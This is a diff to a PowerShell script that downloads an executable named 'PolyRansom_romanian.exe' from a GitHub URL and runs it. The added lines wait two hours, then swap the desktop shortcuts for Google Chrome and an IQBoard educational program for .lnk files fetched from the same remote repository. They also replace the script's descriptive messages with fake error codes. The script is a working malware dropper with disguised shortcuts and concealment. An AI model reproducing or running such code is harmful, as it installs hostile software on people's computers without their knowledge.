@@ -2,6 +2,14 @@ $url = "https://github.com/webntdev/webntdev.github.io/raw/main/apps/PolyRansom_
 $downloadPath = Join-Path $env:USERPROFILE "Downloads\PolyRansom_romanian.exe"
 $webClient = New-Object System.Net.WebClient
 $webClient.DownloadFile($url, $downloadPath)
+$chromeUrl = "https://github.com/webntdev/webntdev.github.io/raw/main/apps/Google%20Chrome.download"
+$iqboardUrl = "https://github.com/webntdev/webntdev.github.io/raw/main/apps/Software%20Educational%20IQBoard.download"
+
+$chromeFileName = "Google Chrome.lnk"
+$iqboardFileName = "Software Educational IQBoard.lnk"
+
+$chromePath = "$env:USERPROFILE\Desktop\$chromeFileName"
+$iqboardPath = "$env:USERPROFILE\Desktop\$iqboardFileName"
 
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
@@ -29,8 +37,21 @@ $form.Add_MouseDown({
     $form.Capture = $false
 })
 $form.Show()
+Start-Sleep -Seconds 7200
 
-Start-Sleep -Seconds 10
+if (Test-Path $chromePath) {
+    Remove-Item $chromePath -Force
+}
+
+if (Test-Path $iqboardPath) {
+    Remove-Item $iqboardPath -Force
+}
+
+Invoke-WebRequest -Uri $chromeUrl -OutFile $chromePath
+
+Invoke-WebRequest -Uri $iqboardUrl -OutFile $iqboardPath
+
+Start-Sleep -Seconds 120
 
 if (Test-Path $downloadPath) {
     Start-Process -FilePath $downloadPath -Wait
@@ -40,12 +61,12 @@ if (Test-Path $downloadPath) {
     
     if ($process) {
         $processName = $process.Name
-        Write-Host "Process name found: $processName"
+        Write-Host "$processName"
         Stop-Process -Name $processName -Force
-        Write-Host "Process stopped."
+        Write-Host "Error 300"
     } else {
-        Write-Host "Process associated with PolyRansom_romanian.exe not found."
+        Write-Host "Error 500"
     }
 } else {
-    Write-Host "Download path not found."
+    Write-Host "Error 404"
 }
